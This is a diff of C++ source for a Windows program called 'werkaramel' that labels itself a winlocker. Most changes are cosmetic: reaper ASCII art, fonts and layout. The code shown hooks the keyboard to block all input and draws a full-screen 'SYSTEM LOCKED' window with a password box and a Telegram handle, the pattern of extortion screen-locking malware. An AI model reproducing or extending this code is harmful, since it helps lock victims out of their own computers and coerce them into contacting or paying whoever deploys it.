@@ -1,5 +1,5 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — reaper + vас заметили + rules + menu + winlocker
+// werkaramel — reaper + rules + menu + winlocker
 #include <windows.h>
 #include <string>
 #include <thread>
@@ -15,22 +15,21 @@ HWND g_hCon = nullptr;
 std::wstring g_input;
 std::mt19937 g_rng(std::random_device{}());
 
-// ── ЖНЕЦ ────────────────────────────────────────────────────
+// ── ТОТ САМЫЙ ЖНЕЦ ──────────────────────────────────────────
 const wchar_t* REAPER[] = {
-    L"...",
     L"             ;::::;",
     L"           ;::::; :;",
     L"         ;:::::'   :;",
-    L"        ;:::::;     ;.          OOO\\",
-    L"       ,:::::'       ;         OOOOO\\",
-    L"       ::::::;       ;        OOOOOOOO",
-    L"       ;:::::;       ;       / OOOOOOO",
-    L"      ,;::::::;     ;'      /  / DOOOOOO",
-    L"    ;:::::::::`. ,,,;.     /  /     DOOOO",
-    L"  .';:::::::::::::::::;,   /  /        DOOO",
-    L" ,::::::;::::::;;;;::::;, /  /          DOOO",
+    L"        ;:::::;     ;.",
+    L"       ,:::::'       ;           OOO\\",
+    L"       ::::::;       ;          OOOOO\\",
+    L"       ;:::::;       ;         OOOOOOOO",
+    L"      ,;::::::;     ;'         / OOOOOOO",
+    L"    ;:::::::::`. ,,,;.        /  / DOOOOOO",
+    L"  .';:::::::::::::::::;,     /  /     DOOOO",
+    L" ,::::::;::::::;;;;::::;,   /  /        DOOO",
     L";`::::::`'::::::;;;::::: ,#/  /          DOOO",
-    L":`:::::::`;::::::;;::: ;::# /            DOOO",
+    L":`:::::::`;::::::;;::: ;::#  /            DOOO",
     L"::`:::::::`;:::::::: ;::::# /              DOO",
     L"`:`:::::::`;:::::: ;::::::#/               DOO",
     L" :::`:::::::`;; ;:::::::::##                OO",
@@ -85,8 +84,8 @@ BOOL WINAPI CtrlHandler(DWORD type) {
 void SetupConsole() {
     CONSOLE_FONT_INFOEX cfi{};
     cfi.cbSize = sizeof(cfi);
-    cfi.dwFontSize.Y = 16;
-    cfi.dwFontSize.X = 8;
+    cfi.dwFontSize.Y = 12;
+    cfi.dwFontSize.X = 6;
     wcscpy_s(cfi.FaceName, L"Consolas");
     SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
 
@@ -123,7 +122,7 @@ LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
 }
 
 // ═══════════════════════════════════════════════════════════
-// ФАЗА 1 — ЖНЕЦ + ВАС ЗАМЕТИЛИ (без мерцания)
+// ФАЗА 1 — ЖНЕЦ + ВАС ЗАМЕТИЛИ
 // ═══════════════════════════════════════════════════════════
 void PhaseRed() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
@@ -131,7 +130,6 @@ void PhaseRed() {
 
     ClearScreen(0);
 
-    // рисуем жнеца красным
     SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
 
     CONSOLE_SCREEN_BUFFER_INFO csbi;
@@ -141,7 +139,6 @@ void PhaseRed() {
 
     int reaper_lines = sizeof(REAPER) / sizeof(REAPER[0]);
 
-    // стартовая Y — чуть выше центра
     int startY = (rows - reaper_lines - 4) / 2;
     if (startY < 1) startY = 1;
 
@@ -153,7 +150,6 @@ void PhaseRed() {
         WOut(REAPER[i]);
     }
 
-    // ВАС ЗАМЕТИЛИ под жнецом
     std::wstring txt = L"В А С   З А М Е Т И Л И";
     int txtY = startY + reaper_lines + 2;
     if (txtY > rows - 1) txtY = rows - 1;
@@ -253,7 +249,7 @@ void PhaseMenu() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// ФАЗА 4 — WINLOCKER (exe-окно)
+// ФАЗА 4 — WINLOCKER
 // ═══════════════════════════════════════════════════════════
 const COLORREF W_BG = RGB(0, 0, 0);
 const COLORREF W_BLOOD = RGB(150, 0, 0);
@@ -301,7 +297,7 @@ void DrawBigBanner(HDC dc, int x, int y, const std::wstring& s,
 }
 
 void DrawReaperWL(HDC dc, int x, int y) {
-    HFONT font = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+    HFONT font = CreateFontW(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                              CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                              DEFAULT_PITCH, L"Consolas");
@@ -311,9 +307,8 @@ void DrawReaperWL(HDC dc, int x, int y) {
 
     int lines = sizeof(REAPER) / sizeof(REAPER[0]);
     for (int i = 0; i < lines; ++i) {
-        TextOutW(dc, x, y + i * 16, REAPER[i], (int)wcslen(REAPER[i]));
+        TextOutW(dc, x, y + i * 14, REAPER[i], (int)wcslen(REAPER[i]));
     }
-
     SelectObject(dc, old);
     DeleteObject(font);
 }
@@ -327,32 +322,30 @@ void WLPaint(HWND hwnd) {
     FillRect(dc, &rc, bg);
     DeleteObject(bg);
 
-    int sw = rc.right, sh = rc.bottom;
+    int sw = rc.right;
 
     // жнец слева
-    DrawReaperWL(dc, 30, 60);
+    DrawReaperWL(dc, 60, 100);
 
     // баннер справа
-    int bx = sw / 2 + 40;
-    DrawBigBanner(dc, bx, 60, L"WERKARAMEL", W_BLOOD, 60);
+    int bx = sw / 2 + 60;
+    DrawBigBanner(dc, bx, 100, L"WERKARAMEL", W_BLOOD, 60);
 
-    DrawWLStr(dc, bx, 145, L"W I N L O C K E R", W_BLOOD_DK, 22);
+    DrawWLStr(dc, bx, 185, L"W I N L O C K E R", W_BLOOD_DK, 22);
 
-    // разделитель
     HPEN pen = CreatePen(PS_SOLID, 2, W_BLOOD);
     HPEN op = (HPEN)SelectObject(dc, pen);
-    MoveToEx(dc, bx, 185, nullptr);
-    LineTo(dc, sw - 40, 185);
+    MoveToEx(dc, bx, 225, nullptr);
+    LineTo(dc, sw - 60, 225);
     SelectObject(dc, op);
     DeleteObject(pen);
 
-    DrawWLStr(dc, bx, 205, L"SYSTEM LOCKED", W_RED, 50, true);
-    DrawWLStr(dc, bx, 280, L"введите пароль:", W_FG, 20);
-    DrawWLStr(dc, bx, 305, L"tg: @werkaramel", W_BLOOD, 20);
+    DrawWLStr(dc, bx, 245, L"SYSTEM LOCKED", W_RED, 50, true);
+    DrawWLStr(dc, bx, 320, L"введите пароль:", W_FG, 20);
+    DrawWLStr(dc, bx, 345, L"tg: @werkaramel", W_BLOOD, 20);
 
-    // поле ввода
-    int boxX = bx, boxY = 350;
-    int boxW = sw - bx - 40;
+    int boxX = bx, boxY = 390;
+    int boxW = sw - bx - 60;
     if (boxW > 600) boxW = 600;
     int boxH = 60;
 
@@ -373,11 +366,9 @@ void WLPaint(HWND hwnd) {
     DrawWLStr(dc, boxX + 20, boxY + 16, masked, W_FG, 32);
 
     if (wl_wrong) {
-        DrawWLStr(dc, bx, boxY + boxH + 20, L"НЕВЕРНЫЙ ПАРОЛЬ",
-                  W_RED, 24, true);
+        DrawWLStr(dc, bx, boxY + boxH + 20, L"НЕВЕРНЫЙ ПАРОЛЬ", W_RED, 24, true);
     } else {
-        DrawWLStr(dc, bx, boxY + boxH + 20, L"[ Enter ] разблокировать",
-                  W_DIM, 20);
+        DrawWLStr(dc, bx, boxY + boxH + 20, L"[ Enter ] разблокировать", W_DIM, 20);
     }
 
     EndPaint(hwnd, &ps);
